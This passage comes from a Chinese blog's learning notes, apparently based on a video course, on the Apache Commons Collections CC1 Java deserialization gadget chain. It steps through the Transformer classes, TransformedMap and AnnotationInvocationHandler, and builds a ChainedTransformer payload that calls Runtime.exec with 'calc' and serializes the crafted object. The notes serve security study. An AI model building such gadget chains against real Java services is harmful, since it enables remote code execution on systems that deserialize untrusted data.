class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> cc链 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC链学习笔记-CC1链</title>
      <link href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE/"/>
      <url>/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>声明：本文为b站白日梦组长视频学习笔记，如有侵权，联系我速删</p><p>组长b站的传送门：<a href="https://space.bilibili.com/2142877265/?spm_id_from=333.999.0.0">https://space.bilibili.com/2142877265/?spm_id_from=333.999.0.0</a></p></blockquote><blockquote><p>Commons Collections 包为 Java 标准的 Collections API 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让使用者在开发应用程序的过程中，既保证了性能，同时也能大大简化了代码。</p></blockquote><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE.assets/image-20220803142858318.png" alt="image-20220803142858318"></p><h1 id="一、Tranformer接口"><a href="#一、Tranformer接口" class="headerlink" title="一、Tranformer接口"></a>一、Tranformer接口</h1><blockquote><p>漏洞主要运用ChainedTransformer、ConstantTransformer、InvokerTransformer这三个类。这三个类都是实现了Transformer接口的类，该接口包含了一个transform方法，以使每个实现了该接口的类可以进行固定类型的转化。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ConstantTransformer类的transform方法</strong></p><p>该类中的transform方法：接受一个对象返回一个常量，无论接收什么对象都返回 iConstant。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NULL_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>InvokerTransformer类中的transform方法</strong></p><p>该类中的transform方法：接收一个对象，通过Java的反射机制获取该对象的运行时类和方法，并进行反射调用。其中方法值、参数等均是可控的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ChainedTransformer类中的transform方法</strong><br>该类 中的transform方法：当传入的是一个数组时候，开始循环读取，对每个参数都会调用transform方法，并将前一个对象的transform方法的返回值，当作下一个对象的transfrom方法的参数值进行调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>使用InvokerTransformer执行命令</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>弹出计算器</p><h1 id="二、挖掘CC1链的过程"><a href="#二、挖掘CC1链的过程" class="headerlink" title="二、挖掘CC1链的过程"></a>二、挖掘CC1链的过程</h1><p>根据流程图，我们从后向前找，已经找到了危险方法transform，现在应该找一个调用了transform的类</p><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE.assets/image-20220803172545588.png" alt="image-20220803172545588"></p><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE.assets/image-20220803181433172.png" alt="image-20220803181433172"></p><p>我们这里尝试使用TransformedMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TransformedMap</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE.assets/20190824134718811.png" alt="在这里插入图片描述"></p><p>checkSetValue是protected的，<code>TransformedMap.decorate(map, null, invokerTransformer);</code>返回是Map类型的，不可以直接调用，我们需要找一个能调用checkSetValue方法的</p><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE.assets/image-20220803183616053.png" alt="image-20220803183616053"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AbstractInputCheckedMapDecorator类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isSetValueChecking()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySet</span>(map.entrySet(), <span class="built_in">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> map.entrySet();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其实这里的MapEntry就是TransformedMap中存的一个键值对，类似于如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:map.entrySet())&#123;</span><br><span class="line">            entry.setValue(<span class="string">&quot;newValue&quot;</span>);</span><br><span class="line">            System.out.println(entry);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>MapEntry中的setValue就是对Map中的重写，所以说，在遍历TransformedMap时就可以调用setValue</p><p><strong>其实我们发现TransformedMap是没有entrySet方法的，所以调用的是它的父类AbstractInputCheckedMapDecorator类的entrySet方法。</strong></p><p><strong>this指代的就是调用entrySet方法的对象transformedMap</strong></p><blockquote><p>this在构造器中使用，默认指代当前new的对象</p><p>在成员方法中的this,默认指代调用成员方法的对象</p><p>this不能使用在static方法中</p></blockquote><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220807122001706.png" alt="image-20220807122001706" style="zoom:33%;"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">      entry.setValue(r);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE.assets/image-20220803185613057.png" alt="image-20220803185613057"></p><p>下一步要找到是调用setValue的类，最好是readObject直接调用setValue</p><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220803185949434.png" alt="image-20220803185949434" style="zoom:33%;"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AnnotationInvocationHandler类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220803190400926.png" alt="image-20220803190400926" style="zoom:33%;"><p>我们注意这个类不是public的，需要用反射来访问创建实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class, transformedMap);</span><br></pre></td></tr></table></figure><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220805063041185.png" alt="image-20220805063041185" style="zoom:50%;"><h2 id="目前面临的问题："><a href="#目前面临的问题：" class="headerlink" title="目前面临的问题："></a>目前面临的问题：</h2><p>1.我们需要给setValue传递一个对象r,但是现在好像无法控制</p><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220803191424635.png" alt="image-20220803191424635" style="zoom:33%;"><p>2.Runtime类是不能序列化的，我们需要使用反射创建Runtime的对象</p><p>3.要想执行setValue,还需要满足两个if条件</p><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220803192509911.png" alt="image-20220803192509911" style="zoom:33%;"><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><ul><li><h5 id="反射创建Runtime的对象执行命令"><a href="#反射创建Runtime的对象执行命令" class="headerlink" title="反射创建Runtime的对象执行命令"></a>反射创建Runtime的对象执行命令</h5></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//正常版本</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntime.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InvokerTransformer版本</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntime);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ChainedTransformer版本</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><ul><li><h5 id="进入第一个if"><a href="#进入第一个if" class="headerlink" title="进入第一个if"></a>进入第一个if</h5></li></ul><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220804125736324.png" alt="image-20220804125736324" style="zoom:33%;"><p>第一个if的条件是memberType不等于空，追踪一下memberType</p><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220804152824373.png" alt="image-20220804152824373" style="zoom:33%;"><p>​<img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE.assets/image-20220804153013834.png" alt="image-20220804153013834"></p><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220804153105490.png" alt="image-20220804153105490" style="zoom:33%;"><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220804153940851.png" alt="image-20220804153940851" style="zoom:33%;"><p>首先，type就是我们在构造方法中传递的Override.class，然后调用getInstance获取一个Override实例annotationType，调用其memberTypes方法，返回此注解类型的成员类型（成员名称 -&gt; 类型映射）meberTypes, 然后在其中查找成员名称为name的成员类型。（name为我们传递的map中的key）</p><p>因为Override成员类型为空，所以不能进入第一个if</p><p><strong>由此可知，我们需要找一个有成员类型的注解，并将map中的key设置为其成员名称即可</strong></p><p><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220804155401995.png" alt="image-20220804155401995" style="zoom:25%;"><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220804155427919.png" alt="image-20220804155427919" style="zoom: 25%;"></p><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220804155629572.png" alt="image-20220804155629572" style="zoom:50%;"><p>进入第一个if</p><ul><li><h5 id="进入第二个if"><a href="#进入第二个if" class="headerlink" title="进入第二个if"></a>进入第二个if</h5></li></ul><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220804160355273.png" alt="image-20220804160355273" style="zoom:50%;"><blockquote><p>instanceof 是 <a href="http://c.biancheng.net/java/">Java</a> 中的一个双目运算符，由于它是由字母组成的，所以也是 Java 的保留关键字。在 Java 中可以使用 instanceof 关键字判断一个对象是否为一个类（或接口、抽象类、父类）的实例，语法格式如下.</p><p>boolean result &#x3D; obj instanceof Class</p><p>obj 是一个对象，Class 表示一个类或接口。obj 是 class 类（或接口）的实例或者子类实例时，结果 result 返回 true，否则返回 false。</p></blockquote><blockquote><p>isInstance()方法用于检查指定的对象是否兼容分配给该Class的实例。如果指定对象为非null，并且可以强制转换为此类的实例，则该方法返回true。否则返回false。</p></blockquote><p>只要value不能强转为Class类型，就可以进入</p><ul><li><h5 id="构造setValue的参数"><a href="#构造setValue的参数" class="headerlink" title="构造setValue的参数"></a>构造setValue的参数</h5></li></ul><p>我们需要给setValue传递Runtime.Class，最后才能触发到transform(Runtime.Class),但是我们发现这个参数好像不太好控制的</p><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220804161726655.png" alt="image-20220804161726655" style="zoom:50%;"><p>这时，我们可能要请一个大牛登场了</p><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220804161940321.png" alt="image-20220804161940321" style="zoom:50%;"><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220804162000272.png" alt="image-20220804162000272" style="zoom:50%;"><p>ConstantTransformer在调用transform时，无论传递什么参数，都会返回固定值iConstant</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title 